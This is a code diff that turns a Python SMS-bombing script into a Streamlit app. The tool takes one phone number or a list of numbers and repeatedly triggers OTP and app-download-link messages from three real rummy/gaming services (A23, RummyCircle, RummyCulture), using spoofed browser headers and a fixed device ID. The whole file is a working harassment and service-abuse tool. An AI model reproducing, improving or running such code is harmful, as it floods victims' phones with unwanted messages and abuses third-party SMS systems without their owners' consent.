@@ -1,19 +1,32 @@
 import json
 import requests
 import time
+import streamlit as st
 
-choice = int(input("1 enter number \n2 enter Number list \n Select an Option :"))
-if choice == 1:
-    num = input("Enter the mobile number: ")
-    nums = [num]
-elif choice == 2:
-    file_name = input("Enter the name of text file: ")
-    with open(file_name) as f:
-        nums = f.readlines()
-    nums = [x.strip() for x in nums]
+st.title("Bulk API Requests with Streamlit")
 
-req = int(input("Enter the number of requests to be sent: "))
-delay=int(input("Enter the delay of second (1,2,3) :"))
+choice = st.selectbox("Select an Option:", ["Enter Number", "Enter Number List"])
+
+if choice == "Enter Number":
+    num = st.text_input("Enter the mobile number:")
+    nums = [num] if num else []
+else:
+    file_name = st.file_uploader("Upload a text file with phone numbers:", type=["txt"])
+    if file_name is not None:
+        with file_name as f:
+            nums = f.readlines()
+        nums = [x.strip() for x in nums]
+
+if not nums:
+    st.warning("Please enter a mobile number or upload a text file with numbers.")
+    st.stop()
+
+req = st.number_input("Enter the number of requests to be sent:", value=1, step=1)
+delay = st.slider("Enter the delay in seconds:", 1, 10, 2)
+
+st.write("Performing API requests...")
+progress_bar = st.progress(0)
+
 headers = {
     "Sec-Ch-Ua": "\"Chromium\";v=\"109\", \"Not_A Brand\";v=\"99\"",
     "Accept": "application/json, text/plain, */*",
@@ -33,24 +46,39 @@ headers = {
 }
 
 url1 = "https://pla23api.a23.com/PlatformService/support/sendApkLink"
-data1 = {"channelFor":"APK","gameType":"A23Games"}
+data1 = {"channelFor": "APK", "gameType": "A23Games"}
 
-url2 = 'https://www.rummycircle.com/api/fl/auth/v3/getOtp'
-payload = {"deviceId":"e6abe4d3-b210-4a5a-aa99-41a04b3fbd90","deviceName":"","refCode":"","isPlaycircle":False}
+url2 = "https://www.rummycircle.com/api/fl/auth/v3/getOtp"
+payload = {
+    "deviceId": "e6abe4d3-b210-4a5a-aa99-41a04b3fbd90",
+    "deviceName": "",
+    "refCode": "",
+    "isPlaycircle": False,
+}
 
-url3 = 'https://www.rummyculture.com/api/user/sendAppDownloadLink'
+url3 = "https://www.rummyculture.com/api/user/sendAppDownloadLink"
 data = {}
 
-for num in nums:
+for index, num in enumerate(nums, start=1):
+    num = num.strip()
     data1["mobileNumber"] = num
     payload["mobile"] = num
     data["mobile"] = num
     for i in range(req):
         time.sleep(delay)
         response1 = requests.post(url1, headers=headers, json=data1)
-        print(f"Response for {url1} with number {num} : {response1.status_code}")
         response2 = requests.post(url2, headers=headers, data=json.dumps(payload))
-        print(f"Response for {url2} with number {num} : {response2.status_code}")
         response3 = requests.post(url3, headers=headers, json=data)
-        print(f"Response for {url3} with number {num} : {response3.status_code}")
+
+        st.write(f"Request {i+1} for {num}:")
+        st.write(f"Response for {url1}: {response1.status_code}")
+        st.write(f"Response for {url2}: {response2.status_code}")
+        st.write(f"Response for {url3}: {response3.status_code}")
+
+    progress_bar.progress(index / len(nums))
+
+st.success("All requests completed!")
+
+
+
 
